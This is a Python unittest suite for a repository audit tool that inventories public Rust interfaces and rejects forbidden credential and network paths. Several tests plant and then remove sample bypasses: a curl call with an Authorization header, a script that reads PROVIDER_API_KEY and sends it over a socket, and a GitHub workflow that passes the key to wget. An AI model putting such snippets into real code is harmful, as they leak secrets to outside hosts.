import json, subprocess, sys, tempfile, unittest
from pathlib import Path

ROOT=Path(__file__).resolve().parents[1]

class V2CoreAuditTests(unittest.TestCase):
    def run_audit(self,root,output):
        return subprocess.run([sys.executable,str(root/"tools/audit_v2_core.py"),"--root",str(root),"--output",str(output)],capture_output=True,text=True)

    def test_checked_audit_is_exhaustive_mapped_and_reproducible(self):
        with tempfile.TemporaryDirectory() as temporary:
            output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output)
            self.assertEqual(result.returncode,0,result.stdout+result.stderr)
            generated=json.loads(output.read_text());checked=json.loads((ROOT/"evidence/v2-rebuild/core-retention-audit.json").read_text())
            self.assertEqual(generated,checked);self.assertTrue(generated["valid"])
            self.assertEqual(generated["unresolved_candidates"],[]);self.assertEqual(generated["untrusted_candidates"],[])
            self.assertEqual(generated["adapter_direct_path_count"],0)
            self.assertEqual(generated["repository_coverage"]["file_count"],generated["candidate_file_count"])
            self.assertTrue(any(item["kind"]=="repository_unit" and item["identity"]=="flake.nix" for item in generated["records"]))
            identities={item["identity"] for item in generated["records"]}
            for surface in ("CandidateOutput.provider_request_id",":as_str",
                "DispositionKind.ContextRequest","DispositionKind.ActivationFailure","ModelError.InvalidEnvelope",
                "macro-public-type:MachineId","macro-method:MachineId.new"):
                self.assertTrue(any(surface in value for value in identities),surface)
            self.assertTrue(all(item["requirement_ids"] and item["authority"] for item in generated["records"]))
            for kind in ("public_interface","branch","dependency","test","fixture"): self.assertGreater(generated["counts"][kind],0)

    def test_new_adapter_credential_path_fails_closed(self):
        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
        try:
            source.write_text(original+"\npub struct CredentialBroker;\n")
            with tempfile.TemporaryDirectory() as temporary:
                result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("forbidden-adapter-path",result.stdout)
        finally: source.write_text(original)

    def test_unknown_crate_and_non_rust_ambient_path_fail_closed(self):
        attacks={ROOT/"crates/habitat-models/src/ambient.sh":"curl -H 'Authorization: secret' https://invalid\n",
            ROOT/"crates/ambient-bypass/src/lib.rs":"pub fn bypass(){ let _ = reqwest::get(\"https://invalid\"); }\n"}
        try:
            for path,content in attacks.items(): path.parent.mkdir(parents=True,exist_ok=True);path.write_text(content)
            with tempfile.TemporaryDirectory() as temporary:
                result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0)
            self.assertTrue("forbidden-adapter-path" in result.stdout or "crates/ambient-bypass" in result.stdout)
        finally:
            for path in attacks:
                if path.exists(): path.unlink()
            for path in (ROOT/"crates/ambient-bypass/src",ROOT/"crates/ambient-bypass"):
                if path.exists(): path.rmdir()

    def test_non_adapter_crate_ambient_path_fails_closed_by_itself(self):
        source=ROOT/"crates/habitat-context/src/ambient.sh"
        try:
            source.write_text("curl -H 'Authorization: secret' https://invalid\n")
            with tempfile.TemporaryDirectory() as temporary: result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("ambient-core-path",result.stdout)
        finally:
            if source.exists():source.unlink()

    def test_inline_rust_test_is_inventoried(self):
        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
        try:
            source.write_text(original+"\n#[test] fn hidden_inline_test(){ if true {} }\n")
            with tempfile.TemporaryDirectory() as temporary:
                output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output)
                self.assertEqual(result.returncode,0,result.stdout);report=json.loads(output.read_text())
                self.assertTrue(any(item["kind"]=="test" and "hidden_inline_test" in item["identity"] for item in report["records"]))
        finally: source.write_text(original)

    def test_public_fields_and_trait_members_are_inventoried(self):
        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
        try:
            source.write_text(original+"\npub struct AuditSurface { pub visible_field: String }\npub trait AuditTrait { type Output; fn execute(&self); }\n")
            with tempfile.TemporaryDirectory() as temporary:
                output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output);report=json.loads(output.read_text())
            self.assertEqual(result.returncode,0,result.stdout);identities={item["identity"] for item in report["records"]}
            self.assertTrue(any("AuditSurface.visible_field" in value for value in identities))
            self.assertTrue(any("AuditTrait.Output" in value for value in identities))
            self.assertTrue(any("AuditTrait.execute" in value for value in identities))
        finally:source.write_text(original)

    def test_any_model_or_harness_transcript_state_surface_fails_closed(self):
        source=ROOT/"crates/habitat-models/src/transcript_state.rs"
        try:
            source.write_text("pub struct AuthoritativeTranscript;\n")
            with tempfile.TemporaryDirectory() as temporary:
                result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("provider-transcript-authority-surface",result.stdout)
        finally:
            if source.exists():source.unlink()

    def test_transcript_state_in_any_core_component_fails_closed(self):
        source=ROOT/"src/habitat_state/transcript_state.py"
        try:
            source.write_text("authoritative_transcript = 'state'\n")
            with tempfile.TemporaryDirectory() as temporary: result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("provider-transcript-authority-surface",result.stdout)
        finally:
            if source.exists():source.unlink()

    def test_unmapped_fixture_fails_closed(self):
        fixture=ROOT/"tests/fixtures/unmapped/new.fixture";fixture.parent.mkdir(parents=True,exist_ok=True);fixture.write_text("opaque")
        try:
            with tempfile.TemporaryDirectory() as temporary:
                result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0)
        finally:
            fixture.unlink();fixture.parent.rmdir()

    def test_unmapped_repository_file_outside_core_fails_closed(self):
        source=ROOT/"ambient-unknown.unit"
        try:
            source.write_text("opaque\n")
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("unmapped-repository-unit",result.stdout)
        finally:
            if source.exists():source.unlink()

    def test_new_tool_ambient_credential_path_is_semantically_rejected(self):
        source=ROOT/"tools/credential_bypass.py"
        try:
            source.write_text("import requests\nrequests.get('https://invalid',headers={'Authorization': 'secret'})\n")
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("ambient-core-path",result.stdout)
        finally:
            if source.exists():source.unlink()

    def test_tool_socket_and_workflow_credential_bypasses_fail_closed(self):
        attacks={
            ROOT/"tools/credential_effect_bypass.py":"import os, socket\nvalue=os.environ['PROVIDER_API_KEY']\nsocket.socket().send(value.encode())\n",
            ROOT/".github/workflows/credential-bypass.yml":"steps:\n  - run: wget https://invalid --header=$PROVIDER_API_KEY\n",
        }
        try:
            for path,content in attacks.items():path.parent.mkdir(parents=True,exist_ok=True);path.write_text(content)
            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("ambient-core-path",result.stdout)
        finally:
            for path in attacks:
                if path.exists():path.unlink()
            for directory in (ROOT/".github/workflows",ROOT/".github"):
                if directory.exists() and not any(directory.iterdir()):directory.rmdir()

    def test_nested_enum_and_brace_macro_public_surfaces_are_inventoried(self):
        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
        addition='''
pub enum NestedAudit { Before { value: u8 }, AfterStruct }
macro_rules! make_public { ($name:ident) => { pub struct $name; } }
make_public! { GeneratedSurface }
'''
        try:
            source.write_text(original+addition)
            with tempfile.TemporaryDirectory() as temporary:
                output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output);report=json.loads(output.read_text())
            self.assertEqual(result.returncode,0,result.stdout);identities={item["identity"] for item in report["records"]}
            self.assertTrue(any("NestedAudit.AfterStruct" in value for value in identities))
            self.assertTrue(any("macro-public-type:GeneratedSurface" in value for value in identities))
        finally:source.write_text(original)

    def test_undeclared_dependency_fails_closed(self):
        manifest=ROOT/"crates/habitat-models/Cargo.toml";original=manifest.read_text()
        try:
            manifest.write_text(original.replace("[dependencies]\n","[dependencies]\nambient-network-client = \"1\"\n"))
            with tempfile.TemporaryDirectory() as temporary:
                result=self.run_audit(ROOT,Path(temporary)/"audit.json")
            self.assertNotEqual(result.returncode,0);self.assertIn("untrusted-dependency",result.stdout)
        finally:manifest.write_text(original)

    def test_retained_core_evidence_is_backed_by_executed_suites(self):
        expected={"W07/context-conformance-suite.json":6,"W09/structured-disposition-test.json":7,
            "W10/package-lifecycle-suite.json":4,"W11/cross-backend-conformance-report.json":5}
        for relative,count in expected.items():
            report=json.loads((ROOT/"evidence/work-packets"/relative).read_text())
            proof=report["behavioral_test_proof"]
            self.assertEqual(proof["runner"],"rust-test-binaries")
            self.assertEqual(proof["outcome"],"passed")
            self.assertEqual(proof["test_count"],count)
            self.assertEqual(len(proof["test_names"]),count)
        for packet in ("W07","W09","W10","W11"):
            for report in (ROOT/"evidence/work-packets"/packet).glob("*.json"):
                self.assertIn("behavioral_test_proof",json.loads(report.read_text()),report)

if __name__=="__main__":unittest.main()
